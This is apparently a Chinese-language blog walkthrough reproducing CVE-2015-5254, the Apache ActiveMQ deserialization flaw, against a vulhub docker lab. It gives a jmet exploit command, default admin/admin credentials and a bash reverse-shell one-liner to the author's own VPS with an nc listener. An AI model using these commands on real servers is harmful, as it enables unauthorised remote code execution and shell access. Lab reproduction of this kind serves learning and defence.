# 漏洞复现-ActiveMq 反序列化漏洞（CVE-2015-5254） - 铺哩 - 博客园

> 原文：[`www.cnblogs.com/cute-puli/p/14395750.html`](https://www.cnblogs.com/cute-puli/p/14395750.html)

# 0x00 实验环境

攻击机：Win 10

靶机也可作为攻击机：Ubuntu18 （docker 搭建的 vulhub 靶场）

# 0x01 影响版本

Apache ActiveMQ 5.13.0 之前的 5.x 版本

# 0x02 漏洞复现

（1）实验环境：docker 运行的 vulhub 漏洞环境首先，可直接访问到页面的显示为：

![](img/68af5dd4a42f3bd1a7cc24cd4b5de4c7.png)

（2）使用默认口令：**admin/admin** 进入后台：

![](img/f8785dc4eb560952059da27bfd74ba29.png)

（3）版本为**5.11.1**，存在该编号漏洞：

![](img/e57dc61a23f3d9312902aa41cb249a2f.png)

（4）下载使用如下工具进行漏洞利用：

```
**https://github.com/matthiaskaiser/jmet/releases**
```

这款工具我也是第一次使用，先不管原理，充分发挥脚本小子的优势复现一波。

首先是下载好利用工具：（需要我复现工具的可以先点个关注，然后私聊我）

 ![](img/d37b26816b0789e854218ac9a47e3b74.png)

（5）然后使用如下命令：

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch test" -Yp ROME 有漏洞的 IP   61616 
```

![](img/0c2ceda76f728f80717326735b919f62.png)

虽然存在部分报错，但不影响结果，后台成功生成一条序列号，这里存在一个避坑的地方——记得必须点击此序列号后才会执行上述的**“touch test”**命令：

![](img/556fe6b96cf30ee93492b502a95381f1.png)

进入容器，我们可以发现还尚未创建——**test**文件：

![](img/98e393c407cdac58ac8a9ede35ef9ec4.png)

（6）点击上面的序列号后即可在有漏洞的服务器内生成一个——**test**文件：

![](img/47c67c0176b89925e0719a45bfbd8f4d.png)

 （7）以上是创建文件的操作，此时更换为反弹 shell 的命令即可达到获取服务器 shell 的目的：

```
bash -i >& /dev/tcp/自己的 vps/9999 0>&1
```

（8）此时需要在如下网站进行编码：

```
**http://www.jackson-t.ca/runtime-exec-payloads.html**
```

![](img/73899f4c4fc713d2a1e88097949bd5a4.png)

 （9）编码成功后如上面创建文件的操作，即可 getshell：

![](img/68fd1c70912b2953ae0e99c36f193db1.png)

（10）nc 开启**9999**端口的监听：

![](img/907888d6c4e9e08f16e51aa93b2d425f.png)

# 0x03 实验原理

该漏洞源于程序**没有限制**可在代理中序列化的类。

远程攻击者可借助**特制的序列化的 java 消息服务(JMS)ObjectMessage 对象**利用该漏洞**执行任意代码**。

没有发现有更深入的漏洞原理分析，故希望观者自行查找学习。